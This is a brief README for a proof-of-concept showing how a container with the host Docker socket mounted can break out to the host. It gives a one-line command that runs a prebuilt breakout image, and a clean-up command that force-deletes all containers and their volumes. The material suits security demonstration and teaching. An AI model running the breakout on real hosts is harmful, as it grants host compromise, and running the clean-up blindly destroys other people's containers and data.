# docker-implant-sock-breakout
demo - https://www.lvh.io/posts/dont-expose-the-docker-socket-not-even-to-a-container.html

## Run PoC
`docker run --name poc --rm -v /var/run/docker.sock:/var/run/docker.sock enkaskal/docker-implant-sock-breakout:latest`

## Clean-up PoC

Unfortunately, this exploit leaves the docker container exited on the host, and therefore you will need to clean them up.

For example:

```
# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES
d5f0df4162d7        debian:latest       "/bin/bash -c 'chroo…"   11 seconds ago      Exited (0) 10 seconds ago                       jolly_allen
```

If you don't have any other containers you want to keep, the easiest way to clean-up is to execute:

```
docker rm -fv `docker ps -aq`
```
